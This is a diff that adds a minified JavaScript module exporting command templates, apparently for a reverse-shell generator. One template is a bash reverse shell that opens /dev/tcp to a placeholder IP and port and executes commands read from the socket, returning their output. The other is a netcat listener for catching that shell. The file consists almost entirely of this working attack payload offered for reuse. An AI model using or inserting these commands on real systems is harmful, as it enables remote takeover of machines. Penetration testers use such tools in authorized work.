@@ -1,0 +1,1 @@
+const e=[{title:"bash readline (loop/read)",template:"exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",description:"Reads commands from the socket and executes them, sending stdout/stderr back."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
